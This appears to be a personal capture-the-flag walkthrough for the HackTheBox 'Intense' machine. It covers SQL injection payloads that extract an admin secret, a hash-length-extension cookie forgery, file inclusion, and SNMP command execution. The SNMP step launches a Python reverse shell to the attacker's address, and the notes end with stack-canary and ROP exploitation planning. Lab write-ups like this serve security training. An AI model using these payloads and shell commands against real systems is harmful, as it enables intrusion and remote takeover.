Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 10:08 EDT
Nmap scan report for intense.htb (10.10.10.195)
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds

################################################################################
FOOTHOLD
################################################################################
ffuf -w ~/wordlists/raft-large-directories.txt -u http://intense.htb/FUZZ:
  admin   
  logout  
  login   
  home    
  submit  

/submitmessage: seems vuln to sql?
  unrecognized token: "')"
  app.py shows the code: 
    try:
      query_db("insert into messages values ('%s')" % message)
    except sqlite3.Error as e:
      return str(e)
    return "OK"


read source of /submit pg:
  i see a zipfile src.zip
  lwt.py decodes/encodes token? we have token:
    part1: dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7
      base64 decode: username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
    part2: 4uF40RAA+EnwwNCMtQnkEHP/KCjuoVoqqwoPT9mxGvE=
      base64 decode: gibberish... not base64
    some admin points are revealed, but require admin role... it seems like you
    can inject the cookie though to elevate role and see these logs:
      ever admin function calls is_admin():
        -admin/
        -admin/log/view
        -admin/log/dir

insert into messages values ('%s')
  normally you cant use select statements... but i found out you can concat and
  it will let you do selects:
    message=p' || (SELECT * FROM messages LIMIT 1));--
    '||(SELECT text FROM kdjflsaj));--
    ^ wrote python to inject this and test for tables. Found:
        users
          oid
          rowid
          secret
        messages
          data
          oid
          rowid
    SELECT(CASE WHEN 1=0 THEN "if" ELSE "carp" END), runtime fail BINGO!:
      SELECT (
        CASE 
            WHEN 1 THEN "c1"
            WHEN (SELECT id from NAMES LIMIT 1 OFFSET -99.2) THEN "c2"
        END
      )
        SELECT(CASE WHEN 0=(SELECT 1 from names LIMIT 1) THEN "" ELSE (SELECT 1 from names LIMIT 1 OFFSET .2)END)                                      
        Select(CASE 0=(SELECT 1)WHEN 1 THEN '' ELSE (SELECT 1 from names LIMIT 1 OFFSET .2)END)

      NOTE: used limit 1 offset <NON INTENGER NUMBER> to cause runtime fail case
  WE DID IT, there are two users... the secret is:
    f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
      this is different that the guest secret that we know, so assume its admin
      NOTE: someone else tried: payload = "' AND (SELECT CASE WHEN ((SELECT length(secret) FROM users LIMIT 1) = "+str(i)+") THEN 1 ELSE MATCH(1,1) END ))--"

username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;

hashpumpy for hash length attack to make a legitimate signature (test.py):
dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNTs=.1j70EV093ANGB2SwhrsbHxxsXnxhENqU+VMD5vj5Buc=

LFI works on /admin/log/view
  make requests with a python script (lfi.py) (or postman), burp doesnt work for some reason

but how the ef do you get a shell?
Linux version 4.15.0-55-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) 

SNMP PORT 161 on udp
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 16:19 EDT
  Nmap scan report for intense.htb (10.10.10.195)
  Host is up (0.049s latency).

  PORT    STATE SERVICE VERSION
  161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
  | snmp-info: 
  |   enterprise: net-snmp
  |   engineIDFormat: unknown
  |   engineIDData: f20383648c26d05d00000000
  |   snmpEngineBoots: 603
  |_  snmpEngineTime: 1d06h39m15s
  | snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
  |_  System uptime: 1d06h39m15.80s (11035580 timeticks)
  Too many fingerprints match this host to give specific OS details
  Network Distance: 2 hops
  Service Info: Host: intense

  TRACEROUTE (using port 161/udp)
  HOP RTT      ADDRESS
  1   55.68 ms 10.10.14.1
  2   50.69 ms intense.htb (10.10.10.195)

  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds

  Host IP                       : 10.10.10.195                                                                      
  Hostname                      : intense                                                                           
  Description                   : Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 
  Contact                       : Me <user@intense.htb>                                                             
  Location                      : Sitting on the Dock of the Bay                                                    
  Uptime snmp                   : 1 day, 06:46:54.68                                                                
  Uptime system                 : 1 day, 06:46:27.68                                                                
  System date                   : 2020-7-19 20:27:31.0                                                              

[+] 10.10.10.195:161 - Login Successful: public (Access level: read-only); Proof (sysDescr.0): Linux intense 4.15.0-55 -generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64                                                            
use the lfi to find a file called /etc/snmp/snmpd.conf which will reveal a community string: SuP3RPrivCom90
UDP 38060 port is open

/etc//systemd/system//noteserver.service tells us root is running noteserver...
def need a shell...
https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e

use one_shot_rce.sh
perform command:  snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 intense.htb 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = /bin/nc 'nsExtendArgs."command"' = "10.10.14.33 1337"
  ^
  /usr/bin/python3
  ^^
  -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.33",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

see command:  see command:  see command:  see command:  see command:  see command:  see command:  see command:  see command:  snmpwalk -v 1 -c SuP3RPrivCom90 intense.htb nsExtendObjects

upgrade shell: python3 -c 'import pty; pty.spawn("/bin/bash")'

gcc
  -Wall
  -pie
  -fPIE
  -fstack-protector-all
  -D_FORTIFY_SOURCE=2
  -Wl,-z,now
  -Wl,-z,relro

echo bytes to exploit: echo -e '\x01'

################################################################################
gdb'in
################################################################################
0x7fffffffdf50: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdf58: 0x61    0x61    0x61    0x61    0x69    0x7f    0x00    0x00
^ end of note buffer

0x7fffffffdf60: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
^
some other variable

0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7
^ i think stack canary

0x7fffffffdf70: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
^ ebp

0x7fffffffdf78: 0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
^ return pointer we want to smash

################################################################################
gdb'in
################################################################################
0x7fffffffdf50: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffdf58: 0x61    0x61    0x61    0x61    0x69    0x7f    0x00    0x00
^ eob

0x7fffffffdf60: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
^ other variable

0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7
^ stack canary

0x7fffffffdf70: 0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
^ ebp

0x7fffffffdf78: 0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
^ ret

CANARIES ARE SAME! FORK DOESNT CHANGE THE CANARY VALUE!
0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7
0x7fffffffdf68: 0x00    0xfd    0xbb    0x68    0x1e    0x98    0x67    0xc7

################################################################################
localproof
################################################################################
0x61    0x61    0x61    0x61    0xde    0xad    0xbe    0xef
61      61      61      61      ad      de      ef      be EOB

0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
e0      70      ff      ff      7f      ff      00      00 some variable

0x00    0xaf    0x1d    0xa2    0x5b    0x3d    0x7a    0x3e
af      00      a2      1d      3d      5b      3e      7a canary

0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
e0      70      ff      ff      7f      ff      00      00 ebp

0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
57      6d      55      55      55      55      00      00 return

################################################################################
localproof
################################################################################
0x61    0x61    0x61    0x61    0xde    0xad    0xbe    0xef
6161 6161 adde efbe

0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
e070 ffff 7fff 0000

0x00    0x9b    0x62    0xa1    0x21    0x8d    0x37    0x22
9b00 a162 8d21 2237

0x70    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
e070 ffff 7fff 0000

0x6d    0x57    0x55    0x55    0x55    0x55    0x00    0x00
576d 5555 5555 0000

0x58    0xe1    0xff    0xff    0xff    0x7f    0x00    0x00
e158 ffff 7fff 0000

wget my script onto server | hex to see canary

################################################################################
# local stack execution?
################################################################################
STACK IS NOT EXECUTABLE (RW), YOU MUST ROP:
$readelf -l <file>
GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
               0x0000000000000000 0x0000000000000000  RW     0x10

################################################################################
ROP
################################################################################
generic fifo instructions:
  set up to give input:
    mkfifo yourfifo
    cat > yourfifo &
    mypid=$!
    yourprogram < yourfifo

  reverse tcp with nc:
    nc -lvp 1337 -c "nc localhost 5001" < attack
      must say localhost

  write into the connection:
    echo "p" > attack

nc -lvp 1337 < attack
echo "nc localhost 5001" > attack
echo -e '\x01\x01\x61\x03' > attack

local test 0:
776d e277 5559 0000 <-ret raw
00005559e277776d <-ret known
00005559e2776000 <-base known
000000000000176d <-diff

local test 1:
c76d b194 55c0 0000 <-ret raw
000055c0b194c76d <-ret
000055c0b194b000 <-base
000000000000176d <-diff

CONFIRMED BASE IS (ret - 0x176d)
now just user ropper to find gadgets and add the
  gadget address to the base.

HOW TO FIND LIBC GADGETS?
  1) find libc.so @ https://libc.blukat.me/?q=__libc_start_main_ret%3Ae81%2C_IO_2_1_stdin_%3A5c0
    a) cat /proc/self/maps
      /lib/x86_64-linux-gnu/libc-2.27.so
    b) objdump -D /lib/x86_64-linux-gnu/libc-2.27.so | grep @@GLIBC
        00000000003eba00 <_IO_2_1_stdin_@@GLIBC_2.2.5>:                
    c) DL: libc6_2.27-3ubuntu1_amd64.so
    d) md5sum of the victim .so and (c) .so are the same
  
ropper:   pop rdi; ret
int:      SOCKFD
ropper:   pop rsi; ret
readelf:  got.send
ropper:   pop rdx; ret
objdump:  call write

kinda nuts... go to c_files/local and see the sp.py
rop is working to leak libc write and now we can calculate the offset
now we only need to get gadgets in libc
